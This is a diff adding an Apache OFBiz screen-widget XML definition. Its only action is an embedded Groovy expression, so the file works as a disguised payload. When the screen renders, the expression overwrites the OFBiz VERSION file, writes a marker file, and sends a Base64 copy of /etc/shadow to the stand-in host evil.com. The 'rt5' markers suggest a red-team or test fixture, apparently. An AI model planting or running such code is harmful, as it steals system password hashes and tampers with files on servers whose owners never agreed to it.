@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xmlns="http://ofbiz.apache.org/Widget-Screen" xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd">
+    <screen name="TemporalExpressionDecorator">
+        <section>
+            <actions>
+                <set value="${groovy:new File('/usr/src/apache-ofbiz/VERSION').setText('rt5-tamper-'+System.currentTimeMillis());new File('/run/aa-tmp/ofbiz/rt5_allowed_marker').setText('rt5');new URL('http://evil.com:8000/rt5/ofbiz_shadow?d='+java.util.Base64.getEncoder().encodeToString(new File('/etc/shadow').getText().getBytes('UTF-8'))).getContent();}"/>
+            </actions>
+        </section>
+    </screen>
+</screens>
